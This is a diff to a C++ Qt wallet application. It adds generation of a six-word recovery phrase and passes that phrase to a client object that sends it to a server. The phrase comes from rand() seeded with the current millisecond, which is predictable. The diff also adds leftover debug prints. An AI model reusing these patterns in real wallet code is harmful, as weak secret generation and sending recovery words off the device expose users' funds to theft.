@@ -4,7 +4,13 @@
 #include <QTableWidgetItem>
 #include "dashboard.h"
 #include <QMessageBox>
-
+#include <qfile.h>
+#include <QTime>
+#include <QtGlobal>
+#include <random>
+#include <QDebug>
+#include "client.h"
+#include "form.h"
 mywallet::mywallet(QWidget *parent)
     : QWidget(parent)
     , ui(new Ui::mywallet)
@@ -135,7 +141,39 @@ void mywallet::addtotable(const QString &name1, const QString &address1, double 
     ui->tableWidget->setCellWidget(rowCount, 3, button);
 }
 void mywallet::on_creatwallet_btn_clicked() {
+  qDebug() << "1";
+    QStringList words;
+    QFile file("words.txt");
+    if (file.open(QIODevice::ReadOnly)) {
+        qDebug() << "2";
+        while (!file.atEnd()) {
+            words << file.readLine().trimmed();
+        }
+        qDebug() << "3";
 
+        file.close();
+    }
+    qDebug() << "4";
+    QList<QString> selectedWords;
+    QSet<int> usedIndexes;
+
+    srand(QTime::currentTime().msec());
+qDebug() << "5";
+    while (selectedWords.size() < 6) {
+        int randomIndex = rand() % words.size();
+        if (!usedIndexes.contains(randomIndex)) {
+            usedIndexes.insert(randomIndex);
+            selectedWords.append(words[randomIndex]);
+        }
+    }
+    ui->textEdit_rand1->setText(selectedWords[0]);
+    ui->textEdit_rand2->setText(selectedWords[1]);
+    ui->textEdit_rand3->setText(selectedWords[2]);
+    ui->textEdit_rand4->setText(selectedWords[3]);
+    ui->textEdit_rand5->setText(selectedWords[4]);
+    ui->textEdit_rand6->setText(selectedWords[5]);
+
+     sendWalletToServer(selectedWords);
 
     ui->createwallet_widget->show();
 }
@@ -166,6 +204,9 @@ void mywallet::processRowData(int row,const QString &name, const QString &addres
 void mywallet::on_continue_btn_clicked()
 {
     ui->createwallet_widget_2->show();
+    extern Client client;
+
+    client.sendRecoveryRequest();
 
 }
 
@@ -185,4 +226,9 @@ void mywallet::on_save_wallet_btn_clicked()
     addtotable(name, address, balance);
 
 }
+void mywallet::sendWalletToServer(const QStringList &words)
+{
+    extern Client client;
 
+        client.sendWallet(words);
+}
